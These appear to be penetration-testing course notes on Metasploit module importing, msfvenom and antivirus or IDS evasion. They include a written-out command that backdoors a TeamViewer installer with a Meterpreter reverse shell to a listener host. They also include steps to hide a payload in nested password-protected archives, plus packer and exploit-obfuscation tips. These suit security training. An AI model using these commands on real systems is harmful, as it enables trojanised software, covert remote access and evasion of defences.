## Writing and Importing Modules

From ExploitDB we can search with filtering for only Metasploit exploits, we can then load it locally to our framework.

We can copy installed modules to the `/usr/share/metasploit-framework/` location or to the `~/.msf4/` location, which might not have all folders and we will need to create a new folder.

### MSF - Loading Additional Modules at runtime
```shell-session
[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
```

### MSF - Loading Additional Modules
```shell-session
msf6> loadpath /usr/share/metasploit-framework/modules/
```

Alternatively we can run the `reload_all` from inside msfconsole.

### Porting Over Scripts into Metasploit Modules

Ruby modules for Metasploit are always written using hard tabs. To port over scripts written in any programming language to metasploit modules in `.rb` files, we will need to find the appropriate mixins classes and methods required for our module to work, we will need to look up the different entries on the [rubydoc rapid7 documentation](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf).

All necessary information about Metasploit Ruby coding can be found on the [Rubydoc.info Metasploit Framework](https://www.rubydoc.info/github/rapid7/metasploit-framework) related page. From scanners to other auxiliary tools, from custom-made exploits to ported ones, coding in Ruby for the Framework is an amazingly applicable skill.

To create our on module we can look at an existing one as reference or change it according to our needs, an example of this can be found at https://academy.hackthebox.com/module/39/section/417.

If you would like to learn more about porting scripts into the Metasploit Framework, check out the [Metasploit: A Penetration Tester's Guide book from No Starch Press](https://nostarch.com/metasploit). Rapid7 has also created blog posts on this topic, which can be found [here](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/).

## MSFVenom

A powerful payload generator.

## Firewall and IDS/IPS Evasion

With the MSF6 release msfconsole can tunnel AES-encrypted communication from any Meterpreter shell back to our attacker host which will encrypt the traffic sent to the victim, enough to evade most network-based IDS/IPS, sometimes a ruleset will flag traffic based on the sender's IP address, to bypass this we can search for a service that is allowed through, some of the attacks used are:

- [US Government Post-Mortem Report on the Equifax Hack](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
- [Protecting from DNS Exfiltration](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
- [Stoping Data Exfil and Malware Spread through DNS](https://www.infoblox.com/wp-content/uploads/infoblox-whitepaper-stopping-data-exfiltration-and-malware-spread-through-dns.pdf)

To bypass detection when the payload is running on the host, msfvenom offers executable templates which we will inject payloads to the pre-set executable templates, and use any executable as a platform from which we will launch our attack. We can embed the shell code into any installer, package, or program we have in hand, this generates what called a backdoor executable.

Example:
```shell-session
$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

The `-k` flag ensures the application will run as normal upon execution, running it from the CLI will result in another window opening for the backdoor, and not closing until we stop running the payload session interaction on the target.

### Archives

Placing password on an archived piece of information can bypass antivirus, but the antivirus will raise a notification on the dashboard that it cannot scan the data because of the password, and the administrator may inspect it manually.

#### Archiving the payload
```shell-session
$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz # Install the rar utility for Linux
$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
$ rar a ~/test.rar -p ~/test.js # Archive a payload
$ mv test.rar test # Remove the tar extension
$ rar a test2.rar -p test # Archiving the payload again
$ mv test2.rar test2 # Remove the tar extension
```

Now running `msf-virustotal -k <API key> -f test2` will show no antivirus can detect it.

### Packers

Packer refers to the result of executable compression, process where the payload is packed together with an executable program and with the decompression code in one single file, when run the code returns the backdoored executable to the original state, msfvenom provides an ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.

A list of popular packer software:

| | | |
|---|---|---|
|[UPX packer](https://upx.github.io)|[The Enigma Protector](https://enigmaprotector.com)|[MPRESS](https://www.matcode.com/mpress.htm)|
|Alternate EXE Packer|ExeStealth|Morphine|
|MEW|Themida||

If we want to learn more about packers, please check out the [PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf).

### Exploit Coding

We can make an exploit we are writing ourselves or porting over harder for security programs to detect, for example by using randomization, we should also avoid using obvious NOP sleds in BoF exploit.

For more information about exploit coding, we recommend checking out the [Metasploit - The Penetration Tester's Guide](https://nostarch.com/metasploit) book from No Starch Press. They delve into quite some detail about creating our exploits for the Framework.